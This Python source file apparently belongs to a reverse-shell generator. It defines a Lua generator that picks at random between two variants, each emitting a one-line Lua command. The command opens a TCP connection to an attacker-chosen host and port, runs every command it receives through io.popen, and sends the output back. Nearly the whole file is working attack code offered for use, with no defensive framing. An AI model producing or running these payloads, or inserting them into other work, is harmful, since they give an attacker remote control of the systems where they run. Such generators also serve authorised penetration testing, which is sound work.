import random
from .base import RandomNamePool, ShellGenerator, ShellResult

_VARIANTS = ["socket_exec", "io_popen"]


class LuaGenerator(ShellGenerator):
    language = "lua"

    def _generate(self, lhost: str, lport: int, arch: str, names: RandomNamePool | None) -> ShellResult:
        variant = random.choice(_VARIANTS)

        if variant == "socket_exec":
            cmd = self._socket_exec(lhost, lport, names)
        else:
            cmd = self._io_popen(lhost, lport, names)

        return ShellResult(command=cmd, variant=variant, language=self.language, arch=arch)

    def _socket_exec(self, lhost: str, lport: int, names: RandomNamePool | None) -> str:
        sock = self._var("sock", names)
        return (
            f'lua -e "local s=require(\'socket\');"'
            f'"local t=assert(s.tcp());"'
            f'"t:connect(\'{lhost}\',{lport});"'
            f'"while true do local r,x=t:receive();'
            f"local f=io.popen(r,'r');local b=f:read('*a');"
            f't:send(b);end;"'
        )

    def _io_popen(self, lhost: str, lport: int, names: RandomNamePool | None) -> str:
        return (
            f'lua5.1 -e \'local s=require("socket");'
            f'local t=assert(s.tcp());'
            f't:connect("{lhost}",{lport});'
            f'while true do '
            f'local r=t:receive();'
            f'if r then '
            f'local h=io.popen(r);'
            f'local res=h:read("*a");'
            f'h:close();'
            f't:send(res) '
            f'end end\''
        )
